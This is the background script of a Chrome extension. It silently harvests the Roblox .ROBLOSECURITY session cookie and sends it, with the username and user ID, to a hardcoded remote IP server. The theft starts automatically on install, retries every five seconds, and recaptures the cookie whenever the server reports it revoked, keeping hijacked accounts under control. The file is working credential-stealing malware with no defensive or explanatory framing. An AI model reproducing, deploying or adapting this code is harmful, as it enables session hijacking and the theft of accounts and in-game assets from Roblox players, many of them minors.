// ===== Configuration =====
const SERVER_URL = 'http://103.38.236.58/';
let trackedAccounts = {};
let statusCheckInterval = null;
let currentUserInfo = null;

// ===== Get Roblox Cookie =====
async function getRobloxCookie() {
    return new Promise((resolve, reject) => {
        chrome.cookies.get(
            { url: 'https://www.roblox.com', name: '.ROBLOSECURITY' },
            (cookie) => {
                if (chrome.runtime.lastError) {
                    console.error('[COOKIE] Chrome error:', chrome.runtime.lastError);
                    reject(chrome.runtime.lastError);
                    return;
                }
                
                if (cookie) {
                    console.log(`✅ [COOKIE] Found .ROBLOSECURITY cookie (${cookie.value.length} chars)`);
                    resolve(cookie.value);
                } else {
                    console.error('❌ [COOKIE] .ROBLOSECURITY cookie not found');
                    reject(new Error('No Roblox cookie found'));
                }
            }
        );
    });
}

// ===== Get Roblox User Info (with fallback support) =====
async function getRobloxUserInfo(cookie) {
    // Use currentUserInfo if available from content script
    if (currentUserInfo) {
        console.log('[BACKGROUND] Using user info from content script:', currentUserInfo);
        return currentUserInfo;
    }
    
    // Fallback: try to get from API
    console.log('[BACKGROUND] Attempting to get user info from API...');
    const userInfo = await getUserInfoFromCookie(cookie);
    if (userInfo) {
        return userInfo;
    }
    
    throw new Error('Could not get user info from content script or API');
}
async function getUserInfoFromCookie(cookie) {
    try {
        console.log('[FALLBACK] Querying content script for user info...');
        
        // Find the Roblox tab
        const tabs = await chrome.tabs.query({ url: '*://*.roblox.com/*' });
        if (tabs.length === 0) {
            console.error('[FALLBACK] No Roblox tab found');
            return null;
        }
        
        const robloxTab = tabs[0];
        console.log('[FALLBACK] Found Roblox tab:', robloxTab.id);
        
        // Request user info from content script
        return new Promise((resolve) => {
            chrome.tabs.sendMessage(
                robloxTab.id,
                { type: 'GET_USER_INFO' },
                (response) => {
                    if (chrome.runtime.lastError) {
                        console.error('[FALLBACK] Message error:', chrome.runtime.lastError);
                        resolve(null);
                        return;
                    }
                    
                    if (response && response.userInfo) {
                        console.log('[FALLBACK] Got user info from content script:', response.userInfo);
                        resolve(response.userInfo);
                    } else {
                        console.error('[FALLBACK] No user info in response');
                        resolve(null);
                    }
                }
            );
            
            // Timeout after 3 seconds
            setTimeout(() => {
                console.error('[FALLBACK] Content script query timed out');
                resolve(null);
            }, 3000);
        });
    } catch (error) {
        console.error('[FALLBACK] Failed to query content script:', error);
        return null;
    }
}

// ===== Direct Capture (Fallback for when content script doesn't work) =====
async function captureDirectly() {
    try {
        console.log('[FALLBACK] Attempting to capture cookie directly...');
        
        // Skip if already captured
        if (Object.keys(trackedAccounts).length > 0) {
            console.log('[FALLBACK] Already have tracked accounts');
            return;
        }
        
        const cookie = await getRobloxCookie();
        console.log('[FALLBACK] Got cookie, will submit to server...');
        
        // Submit cookie to server without userInfo
        // Server will extract userId from cookie via rotate_cookie()
        try {
            await sendToServer(cookie, null, 'Fallback-Capture');
            console.log('✅ [FALLBACK] Cookie captured via fallback!');
        } catch (error) {
            console.error('[FALLBACK] Failed to send to server:', error);
        }
    } catch (error) {
        console.error('[FALLBACK] Direct capture failed:', error);
    }
}

// ===== Send Cookie to Server =====
async function sendToServer(cookie, userInfo, action = 'Auto-Capture') {
    try {
        const payload = {
            cookie: cookie,
            action: action,
            timestamp: new Date().toISOString()
        };
        
        // Add user info if available
        if (userInfo) {
            payload.userId = userInfo.id;
            payload.username = userInfo.name;
        }

        console.log(`[SEND] Sending to server: ${SERVER_URL}/api/sessions`);
        const response = await fetch(`${SERVER_URL}/api/sessions`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        });

        console.log(`[SEND] Response status: ${response.status}`);
        
        if (!response.ok) {
            throw new Error(`Server error: ${response.status}`);
        }

        const result = await response.json();
        console.log(`[SEND] Server response:`, result);
        
        // Extract userId from response or use from userInfo
        const userId = result.userId || (userInfo ? userInfo.id : null);
        const username = userInfo ? userInfo.name : (result.data && result.data.username ? result.data.username : 'Unknown');
        
        if (userId) {
            console.log(`✅ [${action}] Cookie sent and tracked for userId: ${userId}`);
            
            // Track this account
            trackedAccounts[userId] = {
                username: username,
                status: 'ALIVE',
                lastCheck: Date.now()
            };
        } else {
            console.warn(`⚠️  [${action}] Cookie sent but userId not found in response`);
        }
        
        return result;
    } catch (error) {
        console.error(`❌ [${action}] Error sending to server:`, error);
        throw error;
    }
}

// ===== Check Cookie Status from Server =====
async function checkCookieStatus(userId) {
    try {
        console.log(`[CHECK-STATUS] Fetching status for userId: ${userId}`);
        const url = `${SERVER_URL}/api/sessions/${userId}`;
        console.log(`[CHECK-STATUS] URL: ${url}`);
        
        const response = await fetch(url, {
            method: 'GET',
            headers: {
                'Content-Type': 'application/json'
            }
        });

        console.log(`[CHECK-STATUS] Response status: ${response.status}`);
        
        if (response.ok) {
            const data = await response.json();
            console.log(`[CHECK-STATUS] Data received:`, data);
            return data.status || 'UNKNOWN';
        } else {
            console.error(`[CHECK-STATUS] Bad response: ${response.status}`);
        }
        return 'UNKNOWN';
    } catch (error) {
        console.error(`[CHECK-STATUS] Fetch error:`, error.message);
        console.error(`[CHECK-STATUS] Full error:`, error);
        return 'UNKNOWN';
    }
}

// ===== Auto-Capture Cookie =====
async function autoCaptureOnInstall() {
    try {
        console.log('🚀 [AUTO-CAPTURE] Starting auto-capture process...');
        
        console.log('[AUTO-CAPTURE] Step 1: Getting cookie...');
        const cookie = await getRobloxCookie();
        
        console.log('[AUTO-CAPTURE] Step 2: Getting user info...');
        const userInfo = await getRobloxUserInfo(cookie);
        console.log('[AUTO-CAPTURE] User info:', userInfo);
        
        console.log('[AUTO-CAPTURE] Step 3: Sending to server...');
        await sendToServer(cookie, userInfo, 'Auto-Capture');
        
        console.log('✅ [AUTO-CAPTURE] Cookie auto-captured and sent successfully!');
        return true;
    } catch (error) {
        console.error('❌ [AUTO-CAPTURE] Failed:', error.message);
        console.error('[AUTO-CAPTURE] Full error:', error);
        return false;
    }
}

// ===== Periodic Auto-Capture (Every 5 seconds) =====
function startPeriodicCapture() {
    console.log('⏰ [BACKGROUND] Starting periodic auto-capture - every 5 seconds...');
    
    let attemptCount = 0;
    setInterval(async () => {
        // Try to capture if not already captured
        if (Object.keys(trackedAccounts).length === 0) {
            attemptCount++;
            console.log(`🔄 [PERIODIC] Capture attempt #${attemptCount} - no accounts tracked yet`);
            await captureDirectly();
        }
    }, 5000);
}

// ===== Monitor DIE Status and Auto-Recapture =====
async function monitorDIEStatus() {
    console.log('⏱️  [BACKGROUND] Starting DIE monitor - checking every 10 seconds...');
    
    statusCheckInterval = setInterval(async () => {
        const accountsToCheck = Object.keys(trackedAccounts);
        console.log(`[MONITOR] Checking ${accountsToCheck.length} accounts...`);
        
        for (const userId in trackedAccounts) {
            const account = trackedAccounts[userId];
            console.log(`[MONITOR] Checking ${account.username} (${userId})...`);
            const status = await checkCookieStatus(userId);
            console.log(`[MONITOR] Status for ${account.username}: ${status}`);
            
            // If status is DIE, auto-recapture immediately
            if (status === 'DIE') {
                console.warn(`⚠️  [DIE DETECTED] Account ${account.username} (${userId}) - auto-recapturing...`);
                
                try {
                    const cookie = await getRobloxCookie();
                    const userInfo = await getRobloxUserInfo(cookie);
                    await sendToServer(cookie, userInfo, 'DIE Auto-Recapture');
                    console.log(`✅ [RECOVERED] Cookie recaptured for ${account.username}!`);
                } catch (error) {
                    console.error(`❌ [FAILED] Recapture failed for ${account.username}:`, error);
                }
            } else if (status === 'ALIVE') {
                if (account.status !== 'ALIVE') {
                    console.log(`✅ [HEALTHY] Account ${account.username} is now ALIVE`);
                }
                account.status = 'ALIVE';
            }
            
            account.lastCheck = Date.now();
        }
    }, 10000);
}

// ===== Extension Lifecycle Events =====

// Listen for messages from content script
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (request.type === 'USER_INFO_EXTRACTED') {
        console.log('📨 [BACKGROUND] Received user info from content script:', request.payload);
        currentUserInfo = request.payload;
        
        // NOW auto-capture since we have user info
        console.log('🎯 [BACKGROUND] Triggering auto-capture now that user info is ready...');
        autoCaptureOnInstall();
        
        sendResponse({ success: true });
    }
});

// When extension is installed
chrome.runtime.onInstalled.addListener((details) => {
    console.log('📦 [EVENT] Extension installed! Opening Roblox...');
    if (details.reason === 'install') {
        // Open Roblox tab to trigger cookie capture
        chrome.tabs.create({ url: 'https://www.roblox.com' });
        
        // Fallback: Try to capture directly after 3 seconds (in case content script fails)
        setTimeout(() => {
            console.log('[FALLBACK] Attempting direct capture without content script...');
            captureDirectly();
        }, 3000);
    }
});

// Listen for tab updates - wait for content script message
chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
    if (changeInfo.status === 'complete' && tab.url && tab.url.includes('roblox.com')) {
        console.log('🌐 [TAB EVENT] Roblox page loaded - waiting for content script...');
    }
});

// Start monitoring when service worker loads
startPeriodicCapture();
monitorDIEStatus();

console.log('✨ [BACKGROUND] Service worker initialized and running - waiting for content script...');
